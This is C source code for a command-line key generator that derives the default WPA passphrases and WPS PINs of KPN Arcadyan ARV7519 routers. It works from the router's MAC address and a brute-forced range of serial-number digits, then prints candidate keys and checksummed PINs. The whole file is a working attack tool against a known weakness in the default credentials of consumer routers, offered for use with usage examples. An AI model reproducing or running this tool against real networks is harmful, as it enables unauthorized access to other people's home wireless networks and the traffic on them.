#include <stdio.h>
#include <unistd.h>

unsigned int wps_pin_checksum(unsigned int pin);

int main (int argc, char *argv[]) {
int opt = 0;
int chs = 0;
unsigned int mac_1, mac_2, mac_3, mac_4, mac_5, mac_6;
unsigned int m7, m8, m9, m10, m11, m12;
long ss, se;
char *mac = "00:11:22:33:44:55";
char *s_start = "1";
char *s_end = "99999";
char *ke;
int smac;
char smacs[5];
unsigned int s6, s7, s8, s9, s10, k1, k2, x1, x2, x3, y1, y2, y3, z1, z2, z3;
char *ptr;
char *wpa = "000000000000";
char  wpac[12],wpad;
int go = 0;

while ((opt = getopt(argc, argv, "m:v:s:e:?:")) != -1) {
    switch(opt) {
        case 'm':
            mac = optarg;
            chs = 0;
            go++;
        break;

        case 'v':
            chs = 1;
        break;

        case 's':
            s_start = optarg;
            s_end = s_start;
        break;

        case 'e':
            s_end = optarg;
        break;

        case '?':
            printf("\nparameters/usage:\n");
            printf("\n-m [required]: MAC-address of router");
            printf("\n-s [optional]: range start for last 5 digits of serial#. (Also use this to generate WPA key for just one unique serial#)");
            printf("\n-e [optional]: range end for serial# (max. 99999)");
            printf("\n-v [optional]: verbose  - outputs serial# , WPA-key and WPS pin");
            printf("\n\nexample 1: kpn_ARV7519WPA -m 74:31:70:BA:BA:A9\n");
            printf("\nexample 2: kpn_ARV7519WPA -s 85894 -m 00:00:00:B8:68:21 -v 0\n\n");
        break;
        }
}

if (go == 1) {
printf("\nWPA/WPS Generator for KPN Arcadyan ARV7519 routers\n");

sscanf(mac, "%2X:%2X:%2X:%2X:%2X:%2X", &mac_1, &mac_2, &mac_3, &mac_4, &mac_5, &mac_6);
printf("Generating WPA keys for SSID: ARV7519%2X%2X%2X [MAC : %s]\n", mac_4, mac_5, mac_6, mac );
printf("serial# range [last digits] from %s to %s \n\n" , s_start , s_end);
ss = strtol(s_start, &ptr, 10);
if (ss < 1) ss = 1;
if (ss > 99998) ss = 99999;
se = strtol(s_end, &ptr, 10);
if (se < ss) se = ss;
if (se > 99998) se = 99999;

m7 = mac_4 >> 4 & 0x0f;
m8 = mac_4 & 0x0f;
m9 = mac_5 >> 4 & 0x0f;
m10 = mac_5 & 0x0f;
m11 = mac_6 >> 4 & 0x0f;
m12 = mac_6 & 0x0f;

for ( smac = ss ; smac <= se ; smac++){
        sprintf(smacs, "%05d", smac);
        s6 = smacs[0] - '0';
        s7 = smacs[1] - '0';
        s8 = smacs[2] - '0';
        s9 = smacs[3] - '0';
        s10 = smacs[4] - '0';
        k1 = (s7 + s8 + m11 + m12) & 0x0f;
        k2 = (m9 + m10 +s9 + s10) & 0x0f;
        x1 = k1 ^ s10;
        x2 = k1 ^ s9;
        x3 = k1 ^ s8;
        y1 = k2 ^ m10;
        y2 = k2 ^ m11;
        y3 = k2 ^ m12;
        z1 = m11 ^ s10;
        z2 = m12 ^ s9;
        z3 = k1 ^ k2;

        if (chs == 0) printf("%1X%1X%1X%1X%1X%1X%1X%1X%1X%1X%1X%1X\n", x1,y1,z1,s6,x2,y2,z2,k2,x3,y3,z3,k1);

        if (chs == 1) {
                int pin;
                char pinhex[7];
                sprintf(pinhex, "%1X%1X%1X%1X%1X%1X%1X", x1,x2,y1,y2,z1,z2,x3);
                sscanf(pinhex, "%x", &pin);
                pin = pin % 10000000;
                printf("Serial# J....%5d - WPA key: %1X%1X%1X%1X%1X%1X%1X%1X%1X%1X%1X%1X - WPS pin: %07d%d\n", smac, x1,y1,z1,s6,x2,y2,z2,k2,x3,y3,z3,k1,pin, wps_pin_checksum(pin));
                }
        }

 }
}


unsigned int wps_pin_checksum(unsigned int pin) {
        unsigned int accum = 0;
        while (pin) {
                accum += 3 * (pin % 10);
                pin /= 10;
                accum += pin % 10;
                pin /= 10;
                }
        return (10 - accum % 10) % 10;
        }
